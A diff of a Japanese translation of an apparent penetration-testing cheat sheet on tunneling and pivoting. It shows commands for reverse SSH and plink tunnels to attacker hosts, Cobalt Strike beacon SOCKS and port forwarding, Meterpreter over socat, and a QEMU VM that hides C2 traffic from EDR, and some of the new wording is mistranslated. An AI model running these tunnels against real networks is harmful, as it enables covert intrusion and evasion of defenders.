@@ -27,7 +27,7 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-SSH グラフィカル接続 (X)
+SSHグラフィカル接続 (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
@@ -57,7 +57,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### リバースポートフォワーディング
 
-これは、DMZを通じて内部ホストからあなたのホストへのリバースシェルを取得するのに役立ちます：
+これは、DMZを通じて内部ホストからあなたのホストにリバースシェルを取得するのに役立ちます：
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **セキュリティ – テラピン攻撃 (CVE-2023-48795)**
-> 2023年のテラピンダウングレード攻撃により、マンインザミドルが初期SSHハンドシェイクを改ざんし、**任意の転送チャネル**（ `-L`, `-R`, `-D` ）にデータを注入することができます。クライアントとサーバーの両方がパッチ適用されていることを確認してください（**OpenSSH ≥ 9.6/LibreSSH 6.7**）または、SSHトンネルに依存する前に、脆弱な `chacha20-poly1305@openssh.com` および `*-etm@openssh.com` アルゴリズムを `sshd_config`/`ssh_config` で明示的に無効にしてください。
+> 2023年のテラピンダウングレード攻撃により、マンインザミドルが初期SSHハンドシェイクを改ざんし、**任意の転送チャネル**（ `-L`, `-R`, `-D` ）にデータを注入することができます。クライアントとサーバーの両方がパッチ適用されていることを確認してください（**OpenSSH ≥ 9.6/LibreSSH 6.7**）または、SSHトンネルに依存する前に、`sshd_config`/`ssh_config`で脆弱な`chacha20-poly1305@openssh.com`および`*-etm@openssh.com`アルゴリズムを明示的に無効にしてください。
 
 ## SSHUTTLE
 
-**ssh** を介してホストを通じて **サブネットワーク** への **トラフィック** を **トンネル** できます。\
-例えば、10.10.10.0/24 へのすべてのトラフィックを転送すること。
+**ssh**を介して**サブネットワーク**への**トラフィック**をホストを通じて**トンネル**できます。\
+例えば、10.10.10.0/24へのすべてのトラフィックを転送することができます。
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKSプロキシ
 
-すべてのインターフェースでリッスンしているteamserverでポートを開き、**ビークンを通じてトラフィックをルーティングする**ことができます。
+すべてのインターフェースでリッスンしているteamserverでポートを開き、**ビコーンを通じてトラフィックをルーティングする**ことができます。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -149,7 +149,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> この場合、**ポートはビーコンホストで開かれます**。チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送信されます。
+> この場合、**ポートはビーコーンホストで開かれます**。チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送られます。
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -157,13 +157,13 @@ rportfwd stop [bind port]
 注意:
 
 - Beaconのリバースポートフォワードは、**個々のマシン間の中継ではなく、Team Serverへのトラフィックをトンネリングするために設計されています**。
-- トラフィックは**BeaconのC2トラフィック内でトンネリングされます**、P2Pリンクを含みます。
+- トラフィックは**BeaconのC2トラフィック内でトンネリングされ**、P2Pリンクを含みます。
 - **管理者権限は必要ありません** 高ポートでリバースポートフォワードを作成するために。
 
 ### rPort2Port ローカル
 
 > [!WARNING]
-> この場合、**ポートはbeaconホストで開かれます**、Team Serverではなく、**トラフィックはCobalt Strikeクライアントに送信されます**（Team Serverではなく）、そこから指定されたホスト:ポートに送信されます。
+> この場合、**ポートはbeaconホストで開かれ**、Team Serverではなく、**トラフィックはCobalt Strikeクライアントに送信され**（Team Serverではなく）、そこから指定されたホスト:ポートに送信されます。
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -280,7 +280,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### MeterpreterをSSL Socat経由で
+### SSL Socatを介したMeterpreter
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 これはコンソール版のPuTTYのようなもので（オプションはsshクライアントに非常に似ています）、
 
-このバイナリは被害者のマシンで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを自分のマシンのポートに転送するには：
+このバイナリは被害者のコンピュータで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを自分のマシンのポートに転送するには：
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -358,7 +358,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** できます。**SocksOverRDP プラグインが有効になっている** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** します。
+今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** でき、**SocksOverRDP プラグインが有効である** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** することになります。
 
 **RDP** 経由で **接続** し、victim マシンに `SocksOverRDP-Server.exe` バイナリをアップロードして実行します:
 ```
@@ -517,8 +517,8 @@ _必要に応じて、認証とTLSを追加することも可能です。_
 ```
 #### HTTPコールのスニッフィング
 
-_XSS、SSRF、SSTIに役立ちます..._\
-stdoutから直接、またはHTTPインターフェースで [http://127.0.0.1:4040](http://127.0.0.1:4000) 。
+_XSS、SSRF、SSTI ... に役立ちます。_\
+stdoutから直接、またはHTTPインターフェース [http://127.0.0.1:4040](http://127.0.0.1:4000) で。
 
 #### 内部HTTPサービスのトンネリング
 ```bash
@@ -532,7 +532,7 @@ stdoutから直接、またはHTTPインターフェースで [http://127.0.0.1:
 3つのトンネルを開きます：
 
 - 2つのTCP
-- 1つのHTTP、/tmp/httpbin/ からの静的ファイルの公開
+- 1つのHTTP（/tmp/httpbin/ からの静的ファイルの公開）
 ```yaml
 tunnels:
 mytcp:
@@ -547,7 +547,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Cloudflareの`cloudflared`デーモンは、**ローカルTCP/UDPサービス**を公開するアウトバウンドトンネルを作成でき、インバウンドファイアウォールルールを必要とせず、Cloudflareのエッジを待ち合わせ地点として使用します。これは、出口ファイアウォールがHTTPSトラフィックのみを許可し、インバウンド接続がブロックされている場合に非常に便利です。
+Cloudflareの`cloudflared`デーモンは、**ローカルTCP/UDPサービス**を公開するアウトバウンドトンネルを作成でき、インバウンドファイアウォールルールを必要とせず、Cloudflareのエッジを待ち合わせポイントとして使用します。これは、出口ファイアウォールがHTTPSトラフィックのみを許可し、インバウンド接続がブロックされている場合に非常に便利です。
 
 ### Quick tunnel one-liner
 ```bash
@@ -578,7 +578,7 @@ cloudflared tunnel run mytunnel
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp)は、**TCP、UDP、HTTP/S、SOCKS、P2P NATホールパンチング**をサポートする、アクティブにメンテナンスされているGoリバースプロキシです。**v0.53.0 (2024年5月)**から、**SSHトンネルゲートウェイ**として機能できるため、ターゲットホストは追加のバイナリなしで、標準のOpenSSHクライアントのみを使用してリバーストンネルを立ち上げることができます。
+[`frp`](https://github.com/fatedier/frp)は、**TCP、UDP、HTTP/S、SOCKS、P2P NATホールパンチ**をサポートする、アクティブにメンテナンスされているGoリバースプロキシです。**v0.53.0 (2024年5月)**から、**SSHトンネルゲートウェイ**として機能できるため、ターゲットホストは追加のバイナリなしで、標準のOpenSSHクライアントのみを使用してリバーストンネルを立ち上げることができます。
 
 ### クラシックリバースTCPトンネル
 ```bash
@@ -612,7 +612,7 @@ ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_p
 
 ## QEMUを使用した隠密VMベースのトンネル
 
-QEMUのユーザーモードネットワーキング（`-netdev user`）は、*ホスト*上のTCP/UDPポートを**バインド**し、*ゲスト*に転送する`hostfwd`というオプションをサポートしています。 ゲストが完全なSSHデーモンを実行している場合、hostfwdルールは、エフェメラルVM内に完全に存在する使い捨てSSHジャンプボックスを提供します – すべての悪意のある活動とファイルが仮想ディスク内に留まるため、EDRからC2トラフィックを隠すのに最適です。
+QEMUのユーザーモードネットワーキング（`-netdev user`）は、`hostfwd`と呼ばれるオプションをサポートしており、**ホスト上のTCP/UDPポートをバインドし、それを*ゲスト*に転送します**。 ゲストが完全なSSHデーモンを実行しているとき、hostfwdルールは、エフェメラルVM内に完全に存在する使い捨てSSHジャンプボックスを提供します – すべての悪意のある活動とファイルが仮想ディスク内に留まるため、EDRからC2トラフィックを隠すのに最適です。
 
 ### クイックワンライナー
 ```powershell
@@ -654,7 +654,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 • 署名されていない実行可能ファイル（`qemu-system-*.exe`）はディスクに触れるのは2つだけで、ドライバやサービスはインストールされていません。
 • ホスト上のセキュリティ製品は**無害なループバックトラフィック**を検出します（実際のC2はVM内で終了します）。
-• メモリスキャナは、異なるOSに存在するため、悪意のあるプロセス空間を分析しません。
+• メモリスキャナーは、異なるOSに存在するため、悪意のあるプロセス空間を分析しません。
 
 ### Defenderのヒント
 
